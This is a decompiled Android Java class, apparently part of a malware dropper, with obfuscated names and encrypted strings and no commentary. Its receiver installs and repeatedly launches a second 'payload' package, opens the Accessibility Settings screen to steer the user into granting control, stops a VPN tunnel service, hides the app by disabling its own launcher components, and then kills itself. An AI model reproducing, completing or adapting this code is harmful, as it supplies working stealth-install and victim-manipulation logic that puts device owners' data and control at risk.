package com.app.mobile.kp3br9;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.os.Process;
import defpackage.e0;
import java.util.Iterator;
import java.util.List;

/* JADX INFO: loaded from: classes.dex */
public class RcvJbrzn extends BroadcastReceiver {
    public final void b(Context context) {
        Network[] allNetworks;
        try {
            TunnelService.b();
        } catch (Exception unused) {
        }
        try {
            context.stopService(new Intent(context, Class.forName(context.getPackageName() + ".TunnelService")));
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
            if (connectivityManager != null) {
                long jCurrentTimeMillis = System.currentTimeMillis() + 1500;
                while (System.currentTimeMillis() < jCurrentTimeMillis && (allNetworks = connectivityManager.getAllNetworks()) != null) {
                    for (Network network : allNetworks) {
                        NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(network);
                        if (networkCapabilities != null && networkCapabilities.hasTransport(4)) {
                            Thread.sleep(80L);
                        }
                    }
                    return;
                }
            }
        } catch (Exception unused2) {
        }
    }

    public final void c(Context context) {
        try {
            PackageManager packageManager = context.getPackageManager();
            String packageName = context.getPackageName();
            try {
                packageManager.setComponentEnabledSetting(new ComponentName(packageName, packageName + ".MainActivity"), 2, 1);
            } catch (Exception unused) {
            }
            try {
                packageManager.setComponentEnabledSetting(new ComponentName(packageName, packageName + ".TunnelService"), 2, 1);
            } catch (Exception unused2) {
            }
            packageManager.setComponentEnabledSetting(new ComponentName(packageName, packageName + ".RcvJbrzn"), 2, 1);
        } catch (Exception unused3) {
        }
    }

    public final /* synthetic */ void d(Context context, String str) {
        int i;
        List<ActivityManager.RunningAppProcessInfo> runningAppProcesses;
        PayloadUtil.e(context, str);
        b(context);
        int i2 = 0;
        boolean z = false;
        int i3 = 0;
        while (true) {
            if (i2 >= 4) {
                try {
                    Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    intent.addFlags(1342177280);
                    context.startActivity(intent);
                } catch (Exception unused) {
                }
                b(context);
                c(context);
                break;
            }
            if (!z || i3 == 0) {
                try {
                    Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(str);
                    if (launchIntentForPackage != null) {
                        launchIntentForPackage.addFlags(335544320);
                        context.startActivity(launchIntentForPackage);
                    } else {
                        Intent intent2 = new Intent();
                        intent2.setComponent(new ComponentName(str, str + ".A1"));
                        intent2.addFlags(268435456);
                        intent2.addCategory("android.intent.category.LAUNCHER");
                        context.startActivity(intent2);
                    }
                    try {
                        b(context);
                    } catch (Exception unused2) {
                    }
                    z = true;
                } catch (Exception unused3) {
                }
            }
            if (i2 < 2) {
                i = 800;
            } else {
                i = i2 == 2 ? 1200 : 1800;
            }
            try {
                Thread.sleep(i);
            } catch (InterruptedException unused4) {
            }
            try {
                ActivityManager activityManager = (ActivityManager) context.getSystemService("activity");
                if (activityManager != null && (runningAppProcesses = activityManager.getRunningAppProcesses()) != null) {
                    Iterator<ActivityManager.RunningAppProcessInfo> it = runningAppProcesses.iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            z = false;
                            i3 = 0;
                            break;
                            break;
                        } else if (it.next().processName.equals(str)) {
                            i3++;
                            if (i3 < 2) {
                                break;
                            }
                            b(context);
                            c(context);
                            break;
                        }
                    }
                } else {
                    z = false;
                    i3 = 0;
                    break;
                }
            } catch (Exception unused5) {
            }
            i2++;
        }
        try {
            Thread.sleep(300L);
        } catch (InterruptedException unused6) {
        }
        Process.killProcess(Process.myPid());
    }

    public final void e(final Context context, final String str) {
        new Thread(new Runnable() { // from class: t
            @Override // java.lang.Runnable
            public final void run() {
                this.a.d(context, str);
            }
        }).start();
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Intent intent2;
        Intent launchIntentForPackage;
        try {
            String action = intent.getAction();
            if (e0.a("ediGkjWlfJiLji6pdsLMgTm4cdmMzheVR+ajoxGNX/O9sh+cVPehpR4=", "GLbi4FrM").equals(action)) {
                try {
                    Thread.sleep(1500L);
                } catch (Exception unused) {
                }
                Intent launchIntentForPackage2 = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
                if (launchIntentForPackage2 != null) {
                    launchIntentForPackage2.addFlags(335544320);
                    context.startActivity(launchIntentForPackage2);
                    return;
                }
                return;
            }
            int intExtra = intent.getIntExtra("android.content.pm.extra.STATUS", -1);
            if (intExtra == -1) {
                try {
                    try {
                        intent2 = (Intent) (Build.VERSION.SDK_INT >= 33 ? intent.getParcelableExtra("android.intent.extra.INTENT", Intent.class) : intent.getParcelableExtra("android.intent.extra.INTENT"));
                    } catch (Exception unused2) {
                        intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
                    }
                } catch (Exception unused3) {
                    intent2 = null;
                }
                if (intent2 != null) {
                    intent2.addFlags(268435456);
                    context.startActivity(intent2);
                    return;
                }
                return;
            }
            if (intExtra != 0 && !e0.a("myvyfpGTIbhlkI4g+HjQmybiZZGUa8ZNvbEE0UmhuwHSSbo=", "+kWWDP4=").equals(action)) {
                if ((intExtra == 1 || intExtra == 3 || intExtra == 2 || intExtra == 5 || intExtra == 7 || intExtra == 4 || intExtra == 6) && (launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName())) != null) {
                    launchIntentForPackage.addFlags(335544320);
                    launchIntentForPackage.putExtra("RETRY", true);
                    context.startActivity(launchIntentForPackage);
                    return;
                }
                return;
            }
            String stringExtra = intent.getStringExtra(e0.a("HCK+YZd0IW2jZxM4v32MMzUu7m0FOKhy1k0EAItJOgmFXblQAA==", "fUzaE/gdRUPACA=="));
            if (stringExtra == null && intent.getData() != null) {
                stringExtra = intent.getData().getSchemeSpecificPart();
            }
            if (stringExtra == null || stringExtra.equals(context.getPackageName())) {
                return;
            }
            e(context, stringExtra);
        } catch (Exception unused4) {
        }
    }
}
